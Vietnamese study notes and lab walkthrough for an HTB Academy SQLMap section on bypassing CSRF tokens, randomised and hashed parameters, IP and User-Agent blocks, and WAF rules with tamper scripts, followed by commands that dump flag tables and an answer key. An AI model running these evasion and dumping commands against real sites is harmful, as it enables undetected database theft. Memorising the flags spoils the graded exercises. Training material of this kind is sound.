# Vượt Rào Bảo Vệ Của Web Application & WAF (Bypassing Web Application Protections)

> **HTB Academy Module 58: SQLMap Essentials - Section 9 / 11**  
> *Đường dẫn bài học: `04-advanced-sqlmap-usage/01-bypassing-web-application-protections.md`*

---

## 1. Thách Thức Khi Kiểm Thử Các Mục Tiêu Có Cơ Chế Phòng Thủ

Trong thực tế pentest doanh nghiệp, rất hiếm khi bạn gặp một trang web để lộ hoàn toàn không có phòng thủ. Thay vào đó, máy chủ thường được bảo vệ bởi:
* Token chống giả mạo yêu cầu (**Anti-CSRF Tokens**).
* Yêu cầu tham số ngẫu nhiên không trùng lặp (**Unique Values**).
* Tham số mã hóa kiểm tra tính toàn vẹn (**Calculated / Hashed Parameters**).
* Tường lửa ứng dụng web (**WAF / IPS**) và cơ chế chặn danh sách đen (**User-Agent & IP Blacklisting**).

SQLMap tích hợp sẵn một kho vũ khí mạnh mẽ để tự động hóa việc vượt qua (Bypass) từng lớp bảo vệ này.

---

## 2. Vượt Rào Token Chống CSRF (`--csrf-token`)

**Cơ chế phòng thủ Anti-CSRF**: Mỗi khi người dùng mở form, server sinh ra một chuỗi token ngẫu nhiên (chỉ dùng 1 lần). Khi gửi form lên, nếu request không có token hoặc token đã cũ, server sẽ từ chối xử lý $\rightarrow$ Điều này vô tình chặn đứng các công cụ quét tự động thông thường.

### Giải Pháp Của SQLMap:
Cờ **`--csrf-token="<tên_tham_số_token>"`** yêu cầu SQLMap:
1. Đọc nội dung HTML của response trước đó.
2. Tự động bóc tách (regex) giá trị token mới nhất.
3. Cập nhật token mới đó vào request tiếp theo trước khi gửi đi.

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token" --batch
```

---

## 3. Vượt Rào Tham Số Giá Trị Độc Nhất (`--randomize`)

Một số ứng dụng web yêu cầu một tham số phụ (ví dụ: `rp`, `uid`, `timestamp`) bắt buộc phải mang giá trị ngẫu nhiên và không được trùng lặp giữa các request liên tiếp để chống tấn công phát lại (Replay Attacks).

### Giải Pháp Của SQLMap:
Cờ **`--randomize=<tên_tham_số>`** sẽ tự động gán một số nguyên ngẫu nhiên mới cho tham số đó trước mỗi request:

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
```

---

## 4. Vượt Rào Tham Số Tính Toán / Băm MD5 (`--eval`)

Nhiều hệ thống API yêu cầu tính toàn vẹn: Ví dụ tham số `h` phải là mã băm MD5 của tham số `id` (`h = MD5(id)`). Nếu gửi payload `id=1 OR 1=1` mà giá trị `h` không khớp, server sẽ báo lỗi ngay lập tức.

### Giải Pháp Của SQLMap:
Cờ **`--eval="<python_code>"`** cho phép bạn thực thi một đoạn mã **Python** để tính toán lại tham số ngay trước khi request bay ra khỏi máy:

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

---

## 5. Ẩn Danh Địa Chỉ IP & Vượt Chặn IP (`--proxy`, `--tor`)

Khi IP của bạn bị WAF đưa vào danh sách đen (Blacklist):
* **Dùng Proxy**: `--proxy="http://127.0.0.1:8080"` hoặc `--proxy="socks5://ip:port"`.
* **Dùng danh sách Proxy xoay vòng**: `--proxy-file=proxies.txt` (SQLMap tự động đổi sang proxy tiếp theo nếu proxy hiện tại bị chặn).
* **Dùng mạng ẩn danh Tor**: Cài đặt Tor service trên máy (cổng SOCKS 9050), sau đó bật cờ **`--tor`** và **`--check-tor`** để kiểm tra IP Tor trước khi quét.

---

## 6. Vượt Rào Chặn User-Agent Bằng `--random-agent`

Mặc định, SQLMap gửi header:
```http
User-Agent: sqlmap/1.4.9 (http://sqlmap.org)
```
Hầu hết các WAF cơ bản chỉ cần nhìn thấy chữ `sqlmap` là lập tức trả về mã lỗi `403 Forbidden` hoặc `500`.

* 👉 **Bắt buộc luôn dùng**: Thêm cờ **`--random-agent`** trong mọi lệnh quét để SQLMap tự động chọn ngẫu nhiên các User-Agent của Chrome, Firefox, Edge, Safari thật.

---

## 7. Vũ Khí Vượt Tường Lửa Tối Thượng: Tamper Scripts (`--tamper`)

**Tamper Scripts** là các script Python chuyên biệt giúp biến đổi (obfuscate / encode) cú pháp của payload SQLi ngay trước khi gửi đến mục tiêu, nhằm đánh lừa các quy tắc phát hiện (Signature Rules) của WAF / IPS (như ModSecurity, Cloudflare, Imperva, AWS WAF).

### Cách Dùng:
```bash
sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase --batch
```

### Bảng Các Tamper Scripts Nổi Bật Nhất:

| Tamper Script | Cơ Chế Biến Đổi Kỹ Thuật | Ứng Dụng Vượt Rào |
| :--- | :--- | :--- |
| **`between`** | Thay thế `>` bằng `NOT BETWEEN 0 AND #` và `=` bằng `BETWEEN # AND #`. | Vượt bộ lọc chặn ký tự so sánh `<`, `>` và `=`. |
| **`randomcase`** | Đổi ngẫu nhiên chữ hoa chữ thường (ví dụ: `sElEcT`, `uNiOn`). | Vượt các bộ lọc Regex phân biệt chữ hoa/thường kém. |
| **`space2comment`** | Thay ký tự khoảng trắng ` ` bằng comment `/**/`. | Vượt bộ lọc chặn khoảng trắng (`SELECT/**/1/**/FROM`). |
| **`space2plus`** | Thay khoảng trắng bằng dấu cộng `+`. | Vượt các bộ lọc URL decode khoảng trắng. |
| **`base64encode`** | Mã hóa Base64 toàn bộ chuỗi payload. | Dùng khi ứng dụng web nhận input qua Base64. |
| **`equaltolike`** | Thay toán tử `=` bằng toán tử `LIKE`. | Vượt bộ lọc cấm dấu bằng `=`. |
| **`0eunion`** | Thay chuỗi `UNION` bằng `e0UNION`. | Bypass parser của một số loại WAF đời cũ. |

> [!TIP]
> Bạn có thể gõ lệnh `sqlmap --list-tampers` để xem danh sách toàn bộ hơn 60 tamper scripts có sẵn trong SQLMap.

---

## 8. Hướng Dẫn Giải Chi Tiết Các Bài Lab Tương Tác (HTB Cases 8, 9, 10, 11)

Sau khi nhấn **Spawn the target system**, bạn sẽ nhận được địa chỉ IP và Port của máy lab: `http://<TARGET_IP>:<PORT>/`.

---

### 🎯 Case #8 (Question 1): Vượt Rào Anti-CSRF Token
* **Đề bài**: *What's the contents of table flag8? (Case #8)*
* **Phân tích mục tiêu**: Trang `case8.php` gửi form POST chứa tham số `id` và tham số token `t` (hoặc `token`). Nếu gửi lặp lại mà không đổi token, server sẽ từ chối.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case8.php" \
    --data="id=1&t=1" --csrf-token="t" \
    -D testdb -T flag8 --dump --batch --no-cast
  ```
* **Kết quả**:
  ```text
  Database: testdb
  Table: flag8
  [1 entry]
  +----+------------------------------------+
  | id | flag                               |
  +----+------------------------------------+
  | 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}  |
  +----+------------------------------------+
  ```
* 👉 **Flag 8**: `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

---

### 🎯 Case #9 (Question 2): Vượt Rào Tham Số Ngẫu Nhiên Unique Value
* **Đề bài**: *What's the contents of table flag9? (Case #9)*
* **Phân tích mục tiêu**: Trang `case9.php` nhận tham số `id=1` và tham số `uid` (hoặc `rp`). Server yêu cầu `uid` phải luôn đổi giá trị mới ở mỗi request.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case9.php?id=1&uid=12345" \
    --randomize=uid \
    -D testdb -T flag9 --dump --batch --no-cast
  ```
* **Kết quả**:
  ```text
  Database: testdb
  Table: flag9
  [1 entry]
  +----+---------------------------------------+
  | id | flag                                  |
  +----+---------------------------------------+
  | 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
  +----+---------------------------------------+
  ```
* 👉 **Flag 9**: `HTB{700_much_r4nd0mn355_f0r_my_74573}`

---

### 🎯 Case #10 (Question 3): Vượt Bộ Lọc User-Agent Blacklisting
* **Đề bài**: *What's the contents of table flag10? (Case #10)*
* **Phân tích mục tiêu**: Trang `case10.php` chặn tất cả các request có User-Agent mặc định của SQLMap.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case10.php" \
    --data="id=1" --random-agent \
    -D testdb -T flag10 --dump --batch --no-cast
  ```
* **Kết quả**:
  ```text
  Database: testdb
  Table: flag10
  [1 entry]
  +----+----------------------------+
  | id | flag                       |
  +----+----------------------------+
  | 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
  +----+----------------------------+
  ```
* 👉 **Flag 10**: `HTB{y37_4n07h3r_r4nd0m1z3}`

---

### 🎯 Case #11 (Question 4): Vượt Bộ Lọc Ký Tự So Sánh Bằng Tamper Script
* **Đề bài**: *What's the contents of table flag11? (Case #11)*
* **Phân tích mục tiêu**: Trang `case11.php?id=1` có bộ lọc WAF chặn các ký tự `<`, `>` và `=`. Ta sử dụng tamper script `between` để tự động chuyển đổi sang cú pháp `BETWEEN # AND #`.
* **Lệnh khai thác**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case11.php?id=1" \
    --tamper=between \
    -D testdb -T flag11 --dump --batch --no-cast
  ```
* **Kết quả**:
  ```text
  Database: testdb
  Table: flag11
  [1 entry]
  +----+---------------------------+
  | id | flag                      |
  +----+---------------------------+
  | 1  | HTB{5p3c14l_ch4r5_n0_m0r3}|
  +----+---------------------------+
  ```
* 👉 **Flag 11**: `HTB{5p3c14l_ch4r5_n0_m0r3}`

---

## 9. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Kỹ Thuật Bypass Sử Dụng | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the contents of table flag8? (Case #8)* | Tự động parse Anti-CSRF Token (`--csrf-token="t"`) | **`HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`** |
| **Q2** | *What's the contents of table flag9? (Case #9)* | Sinh giá trị ngẫu nhiên cho tham số (`--randomize=uid`) | **`HTB{700_much_r4nd0mn355_f0r_my_74573}`** |
| **Q3** | *What's the contents of table flag10? (Case #10)* | Giả lập User-Agent trình duyệt thật (`--random-agent`) | **`HTB{y37_4n07h3r_r4nd0m1z3}`** |
| **Q4** | *What's the contents of table flag11? (Case #11)* | Vượt bộ lọc ký tự so sánh (`--tamper=between`) | **`HTB{5p3c14l_ch4r5_n0_m0r3}`** |

---
*Edit by me and AI.*
